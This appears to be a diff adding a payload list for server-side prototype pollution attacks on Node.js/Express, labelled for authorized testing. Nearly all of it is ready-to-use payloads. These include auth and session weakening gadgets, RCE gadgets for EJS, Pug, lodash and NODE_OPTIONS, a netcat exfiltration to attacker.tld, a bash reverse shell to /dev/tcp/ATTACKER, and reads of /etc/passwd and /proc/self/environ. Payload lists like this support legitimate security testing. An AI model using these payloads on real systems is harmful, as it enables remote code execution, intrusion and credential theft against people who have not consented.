@@ -1,0 +1,80 @@
+# Server-side prototype pollution — Node.js / Express detection (PortSwigger SSPP + PAT)
+# Pair JSON body with GET query params where noted. Authorized testing only.
+
+# Express parameterLimit DoS/canary — send 2+ query params, one must reflect
+{"__proto__":{"parameterLimit":1}}
+
+# ignoreQueryPrefix — use ??foo=bar in GET after POST pollution
+{"__proto__":{"ignoreQueryPrefix":true}}
+
+# allowDots — use ?foo.bar=baz after pollution
+{"__proto__":{"allowDots":true}}
+
+# JSON response padding change — expect {"foo": "bar"} with extra spaces
+{"__proto__":{"json spaces":"  "}}
+
+# CORS header injection — expect Access-Control-Expose-Headers: foo
+{"__proto__":{"exposedHeaders":["foo"]}}
+
+# HTTP status code change — expect non-default status (e.g. 510)
+{"__proto__":{"status":510}}
+
+# Express trust proxy / IP spoof
+{"__proto__":{"trust proxy":true}}
+{"__proto__":{"trustProxy":true}}
+
+# Body parser limits
+{"__proto__":{"limit":"50mb"}}
+{"__proto__":{"extended":true}}
+{"__proto__":{"inflate":true}}
+{"__proto__":{"strict":false}}
+
+# qs library / nested parsing
+{"__proto__":{"allowPrototypes":true}}
+{"__proto__":{"plainObjects":true}}
+{"__proto__":{"depth":10}}
+
+# Session / auth gadgets
+{"__proto__":{"secret":"knownsecret"}}
+{"__proto__":{"cookie":{"secure":false,"httpOnly":false}}}
+{"__proto__":{"session":{"cookie":{"secure":false}}}}
+{"__proto__":{"passport":{"session":false}}}
+
+# EJS RCE gadget (mizu.re)
+{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('id | nc attacker.tld 4444')"}}
+
+# Pug/Jade style
+{"__proto__":{"block":{"type":"Text","line":1,"blockName":"child_process.execSync('id')"}}}
+
+# Handlebars
+{"__proto__":{"allowProtoPropertiesByDefault":true}}
+{"__proto__":{"allowProtoMethodsByDefault":true}}
+
+# Kibana CVE-2019-7609 style (elasticsearch query context)
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ATTACKER/4444 0>&1");process.exit()//')
+.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+
+# NODE_OPTIONS async RCE
+{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=attacker.oastify.com"}}
+{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('id')"}}}
+
+# child_process spawn options
+{"__proto__":{"shell":true}}
+{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}
+
+# lodash / merge sinks (when app merges user input into options)
+{"__proto__":{"sourceURL":"\nprocess.mainModule.require('child_process').execSync('id')//"}}
+
+# JWT / crypto misconfig via pollution
+{"__proto__":{"algorithm":"none"}}
+{"__proto__":{"ignoreExpiration":true}}
+
+# Redirect / open redirect via polluted defaults
+{"__proto__":{"redirect":"https://attacker.tld"}}
+{"__proto__":{"returnTo":"https://attacker.tld"}}
+
+# File read/write path gadgets
+{"__proto__":{"root":"/"}}
+{"__proto__":{"cwd":"/"}}
+{"__proto__":{"path":"/etc/passwd"}}
+{"__proto__":{"filename":"/etc/passwd"}}
